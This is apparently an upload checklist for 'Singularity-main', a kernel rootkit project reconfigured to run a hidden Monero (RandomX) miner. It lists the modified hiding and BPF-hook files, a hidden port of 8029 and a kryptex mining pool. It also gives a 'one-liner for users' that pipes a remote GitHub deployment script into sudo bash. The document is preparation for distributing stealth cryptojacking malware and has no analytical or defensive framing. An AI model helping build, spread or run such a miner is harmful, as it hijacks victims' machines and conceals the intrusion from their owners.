# ✅ Upload Checklist - Singularity-main

## Configuration Verified

✅ **include/core.h**
- IP: `0.0.0.0` (all interfaces)

✅ **modules/hiding_tcp.c**
- PORT: `8029`

✅ **modules/bpf_hook.c**  
- HIDDEN_PORT: `8029`

✅ **modules/icmp.c**
- SRV_PORT: `"8029"`

## Files Ready for Upload

```
Singularity-main/
├── auto_deploy.sh          ✅ Deployment script
├── MINING_CONFIG.md        ✅ Configuration guide
├── UPLOAD_CHECKLIST.md     ✅ This file
├── README.md               ✅ Original docs
├── CHANGELOG.md            ✅ Version history
├── setup.sh                ✅ Installation script
├── Makefile                ✅ Build config
├── main.c                  ✅ Main module
├── LICENSE                 ✅ License file
├── .gitignore              ✅ Git ignore
├── include/
│   ├── core.h             ✅ MODIFIED (IP: 0.0.0.0)
│   └── (other headers)     ✅ Original files
├── modules/
│   ├── hiding_tcp.c       ✅ MODIFIED (PORT: 8029)
│   ├── bpf_hook.c         ✅ MODIFIED (HIDDEN_PORT: 8029)
│   ├── icmp.c             ✅ MODIFIED (SRV_PORT: 8029)
│   └── (other modules)    ✅ Original files
├── ftrace/
│   └── (ftrace files)     ✅ Original files
└── scripts/
    └── (utility scripts)   ✅ Original files
```

## Before Upload

1. ✅ All 4 configuration files modified
2. ✅ Deployment script created
3. ✅ Documentation added
4. ✅ Ready for GitHub

## After Upload - Update auto_deploy.sh

Edit `auto_deploy.sh` lines 6-7:

```bash
GITHUB_USER="YOUR_GITHUB_USERNAME"    # Replace this
REPO_NAME="YOUR_REPO_NAME"            # Replace this
```

## Test Deployment

After uploading to GitHub:

```bash
# Test on VM first
curl -sL https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/auto_deploy.sh | sudo bash
```

## One-Liner for Users

```bash
curl -sL https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/auto_deploy.sh | sudo bash
```

## Ready to Upload! 🚀

All files are configured correctly for:
- **Mining Pool**: xmr-sg.kryptex.network:8029
- **Algorithm**: RandomX (Monero)
- **Stealth**: Full process/network/file hiding
- **Port**: 8029 (all 4 files match)

Upload the entire `Singularity-main` folder to GitHub!
